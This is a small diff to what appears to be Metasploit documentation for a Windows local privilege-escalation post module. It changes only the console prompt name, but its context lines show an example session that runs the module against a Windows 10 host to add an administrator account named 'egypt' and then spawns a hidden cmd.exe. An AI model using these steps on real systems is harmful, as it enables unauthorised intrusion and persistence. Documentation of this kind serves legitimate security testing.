@@ -65,7 +65,7 @@ C:\Users\msfuser\Downloads>exit
 exit
 meterpreter > background
 [*] Backgrounding session 1...
-msf5 post(windows/escalate/unmarshal_cmd_exec) > show options
+msf post(windows/escalate/unmarshal_cmd_exec) > show options
 
 Module options (post/windows/escalate/unmarshal_cmd_exec):
 
@@ -77,11 +77,11 @@ Module options (post/windows/escalate/unmarshal_cmd_exec):
    SCRIPT_NAME                    no        The filename to use for the COM script file (%RAND% by default).
    SESSION                        yes       The session to run this module on.
 
-msf5 post(windows/escalate/unmarshal_cmd_exec) > set command 'net user /add egypt h@ks4shellz  & net localgroup administrators /add egypt'
+msf post(windows/escalate/unmarshal_cmd_exec) > set command 'net user /add egypt h@ks4shellz  & net localgroup administrators /add egypt'
 command => net user /add egypt h@ks4shellz  & net localgroup administrators /add egypt
-msf5 post(windows/escalate/unmarshal_cmd_exec) > set verbose true
+msf post(windows/escalate/unmarshal_cmd_exec) > set verbose true
 verbose => true
-msf5 post(windows/escalate/unmarshal_cmd_exec) > run
+msf post(windows/escalate/unmarshal_cmd_exec) > run
 
 [!] SESSION may not be compatible with this module.
 [*] Attempting to PrivEsc on WIN10X64-1703 via session ID: 1
@@ -113,7 +113,7 @@ Call:  MarshalInterface
 [*] C:\Users\msfuser\AppData\Local\Temp\NCYcABO.sct already exists on the target. Deleting...
 [*] Deleted C:\Users\msfuser\AppData\Local\Temp\NCYcABO.sct
 [*] Post module execution completed
-msf5 post(windows/escalate/unmarshal_cmd_exec) > sessions -i -1
+msf post(windows/escalate/unmarshal_cmd_exec) > sessions -i -1
 [*] Starting interaction with 1...
 
 meterpreter > execute -f cmd.exe -i -H
